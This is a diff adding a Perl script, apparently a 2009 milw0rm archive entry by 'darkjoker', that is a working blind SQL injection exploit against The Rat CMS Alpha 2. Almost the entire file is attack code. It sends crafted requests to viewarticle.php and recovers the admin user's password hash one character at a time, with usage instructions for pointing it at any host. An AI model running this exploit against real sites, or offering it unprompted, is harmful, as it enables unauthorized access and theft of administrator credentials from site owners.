@@ -1,0 +1,87 @@
+#--+++=============================================================+++--#
+#--+++====== The Rat CMS Alpha 2 Blind SQL Injection Exploit ======+++--#
+#--+++=============================================================+++--#
+#!/usr/bin/perl
+
+use strict;
+use warnings;
+use IO::Socket;
+
+
+sub query {
+	my $chr = shift;
+	my $pos = shift;
+	my $query = "'x' OR ASCII(SUBSTRING((SELECT user_password FROM tbl_auth_user WHERE user_id = 'theadmin'),${pos},1))=${chr}";
+	$query =~ s/ /%20/g;
+	$query =~ s/'/%27/g;
+	return $query;
+}
+
+sub check {
+	my $host = shift;
+	my $path = shift;
+	my $chr  = ord (shift);
+	my $pos  = shift;
+
+	my $sock = new IO::Socket::INET (
+		PeerHost => $host,
+		PeerPort => 80,
+		Proto    => "tcp",
+	);
+	
+	my $query = query ($chr, $pos);
+	print $sock "GET ${path}/viewarticle.php?id=${query} HTTP1.1\r\n\r\n";
+	my $x;
+	while (<$sock>)
+	{
+		$x .= $_;
+	}
+
+	$x =~ s/\s/ /g;
+	$x =~ /<h1 align="center">(.+?)\/h1>/;
+	if (length ($1) > 1)
+	{
+		return 1;
+	}
+	else
+	{
+		return 0;
+	}
+
+	close ($sock);
+}
+
+sub usage {
+	print
+		"\n[+] The Rat CMS Alpha 2 Blind SQL Injection Exploit".
+		"\n[+] Author:  darkjoker".
+		"\n[+] Site:    http://darkjoker.net23.net".
+		"\n[+] Usage:   perl $0 <hostname> <path>".
+		"\n[+] Greetz:  certaindeath\n";
+	exit ();
+}
+
+
+my $host = shift;
+my $path = shift or usage;
+
+my @key = split '', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789*';
+
+my $pos = 1;
+my $chr = 0;
+
+while ($pos <= 32)
+{
+	if (check ($host, $path, $key [$chr], $pos))
+	{
+		print $key [$chr];
+		$chr = -1;
+		$pos++;
+	}
+	$chr++;
+
+}
+
+print "\n";
+
+# milw0rm.com [2009-01-04]
